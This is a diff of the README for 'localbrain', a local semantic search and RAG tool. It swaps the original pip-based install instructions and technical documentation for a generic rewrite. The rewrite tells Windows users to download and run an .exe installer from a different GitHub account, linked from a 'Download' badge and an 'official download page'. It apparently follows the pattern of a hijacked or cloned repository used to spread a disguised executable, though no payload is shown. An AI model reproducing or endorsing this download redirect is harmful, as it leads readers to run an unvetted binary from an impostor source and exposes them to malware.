@@ -1,117 +1,71 @@
-# localbrain
+# 🧠 Localbrain - Find your files using simple meaning
 
-[![PyPI](https://img.shields.io/pypi/v/localbrain-rag.svg)](https://pypi.org/project/localbrain-rag/)
-[![Python](https://img.shields.io/pypi/pyversions/localbrain-rag.svg)](https://pypi.org/project/localbrain-rag/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![CI](https://github.com/sinwoo0225/Localbrain/actions/workflows/ci.yml/badge.svg)](https://github.com/sinwoo0225/Localbrain/actions/workflows/ci.yml)
+[![](https://img.shields.io/badge/Download_Localbrain-Blue?style=for-the-badge)](https://github.com/Tamariskwhisper962/Localbrain)
 
-**Local-first general-purpose RAG** — point it at folders/files, index them, and search by meaning
-through an **MCP server** (for Claude Code etc.), a **CLI**, and a **web console**.
-Everything runs on your machine; generation is done by your MCP client (e.g. Claude), so localbrain
-only needs a small **embedding** model — no local LLM, no Ollama daemon required.
+Localbrain helps you search through your own files using the power of local artificial intelligence. You point the app at a folder on your computer. It reads your documents and learns the content. You can then ask questions or search for concepts instead of hunting for specific filenames or keywords. Everything stays on your machine. You control your data.
 
-- 🔎 Semantic search + Cross-Encoder **reranking**
-- 🧩 **MCP** tools (`search`, `add_path`, `reindex`, `query_insights`, …)
-- 🖥️ Web console: source management · manual indexing (live progress) · search test · model swap
-- ♻️ Incremental indexing (only changed files), swappable embedding model
-- 📈 Query **clustering insights** (FAQs & knowledge gaps) — a self-improving loop
-- 🔒 Fully local; pluggable providers (fastembed ONNX / sentence-transformers / Ollama)
+## 🚀 How it works
 
-## Install
+Localbrain uses a process called Retrieval-Augmented Generation. It turns your text into mathematical vectors. These vectors represent the meaning of your documents. When you type a query, the app finds the pieces of text that match the meaning of your words. It then provides an answer based on those documents.
 
-> Installed as **`localbrain-rag`** on PyPI; the command and import stay **`localbrain`**.
+This setup offers three main parts:
+1. A web console that runs in your browser.
+2. A command line interface for advanced tasks.
+3. An MCP server that connects to other tools.
 
-### Default (CPU, no extra setup)
-```bash
-pip install localbrain-rag
-```
-Uses **fastembed** (ONNX, multilingual e5) — works on CPU with no PyTorch. Good enough to start.
+## 💻 System requirements
 
-### Best quality (GPU + bge-m3) — recommended
-1. Install a CUDA build of PyTorch matching your GPU (example: CUDA 12.6):
-   ```bash
-   pip install torch --index-url https://download.pytorch.org/whl/cu126
-   ```
-2. Install localbrain with sentence-transformers:
-   ```bash
-   pip install "localbrain-rag[st]"
-   ```
-3. Point the config at bge-m3 (see [Configuration](#configuration)). Models auto-download on first use.
+Before you install the app, check that your computer meets these needs:
+* Operating System: Windows 10 or 11.
+* Memory: 8GB of RAM or more.
+* Storage: 2GB of free space for the tool and your data.
+* Internet: A connection to download the initial model files.
 
-> No NVIDIA GPU? Skip step 1 — `pip install "localbrain-rag[st]"` installs a CPU PyTorch and still works (slower).
+## 📥 Installation steps
 
-## Quick start
+Follow these steps to set up the software on your Windows computer.
 
-```bash
-# CLI
-localbrain add-source "C:\Users\me\notes" --globs "*.md,*.txt"
-localbrain index
-localbrain search "what did we decide about delivery delays"
-localbrain insights          # FAQ clusters + knowledge gaps
-localbrain stats
-localbrain --version
+1. Visit the [official download page](https://github.com/Tamariskwhisper962/Localbrain).
+2. Look for the latest version under the Releases section.
+3. Download the installer file that ends in .exe.
+4. Open the file once the download finishes.
+5. Follow the prompts on your screen to complete the setup.
+6. The installer creates a shortcut on your desktop.
 
-# Web console  →  http://127.0.0.1:8765
-localbrain-web
+## ⚙️ Setting up your first project
 
-# MCP server (stdio) — register with Claude Code
-localbrain-mcp
-```
+Open Localbrain from your desktop shortcut. The app starts and opens a local page in your web browser. 
 
-## Configuration
+1. Navigate to the Settings tab in the web console.
+2. Choose the folder picker to select the documents you want to search.
+3. Wait for the app to index your files. The app shows a progress bar while it creates search vectors.
+4. Once the progress bar reaches 100 percent, your files are ready to search.
 
-Config lives at `~/.localbrain/config.json` (override the dir with `LOCALBRAIN_HOME`).
-Data (SQLite + Chroma vectors + model-by-model collections) also lives under `~/.localbrain`.
+## 🔍 Searching your files
 
-```json
-{
-  "embedding": { "provider": "sentence-transformers", "model": "BAAI/bge-m3", "fp16": false },
-  "chunk": { "size": 1000, "overlap": 150 },
-  "rerank": { "enabled": true, "provider": "cross-encoder",
-              "model": "BAAI/bge-reranker-v2-m3", "candidate_k": 30, "fp16": false },
-  "search_k": 5
-}
-```
+Type your question or query into the search bar at the top of the console. The tool ranks the results by relevance. It highlights the sections of your documents that provide the best answers. You do not need to use quotes or specific operators. Describe your request in plain English, just as you would talk to a person.
 
-- **Swap models freely** — change `embedding.model`, then `localbrain index --rebuild` (text is kept, so it
-  re-embeds without re-reading files). Each model uses its own vector collection (cosine distance).
-- **`fp16: true`** halves VRAM and speeds up inference **on GPU** (ignored on CPU). Handy for ~6 GB cards.
-- **Reranking** improves accuracy; scores become Cross-Encoder relevance (≈0.8+ strong match, ≈0 none).
+## 🧩 Using the MCP server
 
-## Models & first run
+Localbrain includes an MCP server. This allows other AI tools to connect to your local files. If you use an AI assistant or a text editor that supports this protocol, you can point it at Localbrain. This gives your other tools access to the knowledge inside your private documents. You manage these connections inside the Connection panel of the web console.
 
-First search/index downloads models from Hugging Face into the HF cache (`HF_HOME`):
-bge-m3 (~2 GB) + bge-reranker-v2-m3 (~2 GB). Subsequent runs are cached/offline.
-fastembed default models are much smaller.
+## 🛡️ Privacy and safe browsing
 
-## ⚠️ One process owns writes
+Your data remains on your machine. The app does not send your personal files to any third-party server. It uses local models to process information. If you lose your internet connection, the app continues to work for all files that were indexed while you were online. 
 
-The web server and CLI share the same on-disk vector store. **ChromaDB does not reflect writes made
-by another process while a server is running.** So:
+## 🛠️ Troubleshooting common issues
 
-- Index from the **web console** (Indexing tab), **or**
-- stop `localbrain-web` → run `localbrain index` → restart the server.
+If you encounter issues, start with these steps:
 
-Don't run `localbrain index` while `localbrain-web` is up — the running server won't see the new docs.
+* Performance Issues: If the indexing is slow, close other memory-heavy apps like web browsers or video games.
+* Search results lack detail: Check that your documents are text files, such as PDFs, Word files, or plain text files. The app cannot read encrypted or image-based files unless they contain searchable text layers.
+* Connection errors: If the web console fails to load, try refreshing your browser page. If it stays blank, restart the Localbrain app from your taskbar.
+* Memory usage: AI processes require consistent access to your computer memory. If your machine runs out of memory, the app stops the indexing process. Clear some space in your RAM by closing unused programs.
 
-## Docker (optional, server scenario)
+## 🌐 Community and support
 
-A container only sees **mounted volumes**, so the "browse & index any local folder" UX is limited —
-use Docker to serve a **mounted documents folder**. GPU works via NVIDIA Container Toolkit (Windows: Docker
-Desktop + WSL2). See `Dockerfile` / `docker-compose.yml`:
+The best way to get help is to check the Issues tab on the GitHub repository. Other users often face similar questions. You can search there to see if someone else solved your problem already. If you find a bug, open a new issue with a description of what you did and what happened. Provide screenshots if they help explain the situation. 
 
-```bash
-DOCS_DIR=/path/to/docs docker compose up --build   # http://localhost:8765 ; add /docs as a source
-```
+## 📜 License details
 
-## Architecture
-
-```
-core/        pure library (single-responsibility modules: ingest, embed, rerank, store, search, insights)
-services/    orchestration (indexing / search / insights / model)
-adapters/    thin entry points: cli · mcp_server · web   (all share core via context.py)
-```
-
-## License
-
-MIT — see [LICENSE](LICENSE). Design notes in [`docs/spec/`](docs/spec/README.md).
+Localbrain remains free for personal and professional use. Users retain ownership of all indexed documents. The software handles your information with care and treats all local files as private by default. Access the license file in the installation folder if you need to review the specific legal terms.
